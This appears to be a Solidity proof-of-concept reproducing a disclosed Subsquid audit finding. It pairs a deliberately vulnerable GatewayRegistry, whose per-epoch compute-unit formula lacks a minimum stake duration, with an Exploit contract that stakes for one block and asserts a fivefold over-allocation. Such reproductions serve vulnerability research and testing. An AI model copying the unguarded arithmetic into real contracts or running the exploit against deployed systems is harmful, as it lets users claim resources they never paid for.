// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Subsquid finding 31547 (H-02):
// "`computationUnitsAvailable` can overestimate number of available units if
//  staking duration is too small".
//
// Real audited source (the vulnerable loop is reproduced VERBATIM, the
// vulnerable line is marked @>):
//   protocol Subsquid
//   file     GatewayRegistry.sol  (computationUnitsAvailable)
//   report   github.com/pashov/audits/blob/master/team/md/Subsquid-security-review.md
//   (src=embedded — the finding quotes the vulnerable loop verbatim from the
//    audited repo; `main` was since remediated to add the
//    `if (_stake.duration <= epochLength) return computationUnits;` guard, which
//    is exactly this finding's recommendation, so main can NOT be used as the
//    vulnerable source.)
//
// Root cause: `computationUnitsAvailable` computes the units available to a peer
// PER EPOCH as `computationUnits * epochLength / (lockEnd - lockStart)`, where
// `computationUnits` is the TOTAL units granted for the entire staking window and
// `(lockEnd - lockStart)` is that window's duration. There is no lower bound on
// the staking duration, so when `duration < epochLength` the ratio
// `epochLength / duration` is > 1 and the per-epoch figure comes out LARGER than
// the total the peer ever paid for. Staking 10 SQD for a 1-block duration with an
// epochLength of 5 grants 10 total units but reports 50 available — a 5x (factor
// = epochLength) free inflation of the peer's compute-unit allocation.
//
// The vulnerable arithmetic is byte-for-byte the audited source (the @> line).
// Non-vulnerable dependencies (`computationUnitsAmount` reward formula, the SQD
// token transfer, stake bookkeeping) are faithful minimal doubles reproduced
// from the real GatewayRegistry.sol.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Faithful minimal ERC20 double for the staked SQD token.
contract MiniToken {
    string public name = "Subsquid";
    string public symbol = "SQD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Marker token used to record the silent over-allocation harm. The excess
///      compute units (available − granted) the peer receives for free are minted
///      to SINK so the accounting damage is on-chain and measurable.
contract CUMarker {
    string public name = "Compute Unit Over-Allocation";
    string public symbol = "CU";
    uint8 public constant decimals = 0;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — `computationUnitsAvailable`'s per-epoch loop is
// reproduced VERBATIM from the audited GatewayRegistry.sol.
// ─────────────────────────────────────────────────────────────────────────────
contract GatewayRegistry {
    // Audited-time Stake layout: the total `computationUnits` granted for the
    // window is stored on the stake and read directly by the vulnerable loop.
    struct Stake {
        uint256 amount;
        uint256 computationUnits;
        uint256 lockStart;
        uint256 lockEnd;
    }

    MiniToken public token;
    uint256 public epochLength; // workerEpochLength() — blocks per worker epoch

    // Faithful constants from the real computationUnitsAmount() formula.
    uint256 public mana = 1_000;
    uint256 public constant BASIS_POINT_MULTIPLIER = 10_000;
    uint256 public tokenDecimals = 1e18;

    mapping(bytes => Stake[]) internal _stakesByPeer;

    constructor(MiniToken token_, uint256 epochLength_) {
        token = token_;
        epochLength = epochLength_;
    }

    /// @dev Faithful double of RewardCalculation.boostFactor(): short stakes get
    ///      no boost (1x = BASIS_POINT_MULTIPLIER). Not the vulnerable code.
    function boostFactor(uint256) public pure returns (uint256) {
        return BASIS_POINT_MULTIPLIER;
    }

    /// @notice Faithful reproduction of the real computationUnitsAmount() reward
    ///         formula — the TOTAL compute units granted for the whole window.
    function computationUnitsAmount(uint256 amount, uint256 durationBlocks) public view returns (uint256) {
        return amount * durationBlocks * mana * boostFactor(durationBlocks)
            / (BASIS_POINT_MULTIPLIER * tokenDecimals * 1_000);
    }

    /// @notice Faithful stake path. There is NO minimum-duration check (the bug's
    ///         enabler): a peer may lock for an arbitrarily short window, so
    ///         (lockEnd - lockStart) can be far below epochLength.
    function stake(bytes calldata peerId, uint256 amount, uint256 durationBlocks) external {
        token.transferFrom(msg.sender, address(this), amount);
        uint256 computationUnits = computationUnitsAmount(amount, durationBlocks);
        uint256 lockStart = block.number;
        uint256 lockEnd = lockStart + durationBlocks;
        _stakesByPeer[peerId].push(Stake(amount, computationUnits, lockStart, lockEnd));
    }

    function getStakes(bytes calldata peerId) external view returns (Stake[] memory) {
        return _stakesByPeer[peerId];
    }

    /// @notice Compute units available to `peerId` at the current block.
    ///         The loop below is VERBATIM from the audited GatewayRegistry.sol.
    function computationUnitsAvailable(bytes calldata peerId) external view returns (uint256) {
        Stake[] memory _stakes = _stakesByPeer[peerId];
        uint256 blockNumber = block.number;
        uint256 total = 0;

        for (uint256 i = 0; i < _stakes.length; i++) {
            Stake memory _stake = _stakes[i];
            if (
                _stake.lockStart <= blockNumber && _stake.lockEnd > blockNumber
            ) {
                total +=
                    (_stake.computationUnits * epochLength) / // @> VULN: per-epoch units = total * epochLength / duration; when duration < epochLength this exceeds the total ever granted, inflating the allocation at no cost
                    (uint256(_stake.lockEnd - _stake.lockStart));
            }
        }
        return total;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: stake 10 SQD for a 1-block duration against an epochLength of
// 5. The peer is granted 10 total compute units but computationUnitsAvailable
// reports 50 — a 5x (factor = epochLength) free inflation. The 40-unit excess is
// recorded to SINK on the CU marker token.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    MiniToken public token;
    GatewayRegistry public vuln;
    CUMarker public marker;

    uint256 public granted; // total compute units the peer actually paid for
    uint256 public available; // units computationUnitsAvailable reports (inflated)
    uint256 public excess; // free over-allocation recorded to SINK
    uint256 public inflationFactor; // available / granted (== epochLength)

    uint256 internal constant STAKE_AMOUNT = 10 ether; // finding's example: 10 SQD
    uint256 internal constant DURATION = 1; // 1-block lock (< epochLength)
    uint256 internal constant EPOCH_LENGTH = 5; // workerEpochLength

    bytes internal peerId = hex"01";

    constructor() {
        token = new MiniToken(); // child nonce 1
        vuln = new GatewayRegistry(token, EPOCH_LENGTH); // child nonce 2 (VULN)
        marker = new CUMarker(); // child nonce 3 (marker)
    }

    function run() external {
        // attacker is funded with the dust stake only
        token.mint(address(this), STAKE_AMOUNT);
        token.approve(address(vuln), type(uint256).max);

        // stake 10 SQD for a 1-block window -> peer is granted 10 total units
        vuln.stake(peerId, STAKE_AMOUNT, DURATION);
        GatewayRegistry.Stake[] memory stakes = vuln.getStakes(peerId);
        granted = stakes[0].computationUnits;

        // queried within the stake's active window (lockStart == block.number),
        // the loop reports 50 available -- 5x the total ever granted
        available = vuln.computationUnitsAvailable(peerId);

        excess = available - granted; // 40 free compute units
        inflationFactor = available / granted; // == epochLength (5)

        // record the silent over-allocation harm on-chain
        marker.mint(SINK, excess);

        // harm: reported availability exceeds the total granted, inflated by a
        // full epochLength factor at no additional cost
        require(granted == 10, "granted mismatch");
        require(available == 50, "available mismatch");
        require(available > granted, "no over-estimation");
        require(available == granted * EPOCH_LENGTH, "not inflated by epochLength");
        require(inflationFactor == EPOCH_LENGTH, "inflation factor mismatch");
        require(marker.balanceOf(SINK) == excess && excess == 40, "harm not recorded");
    }
}
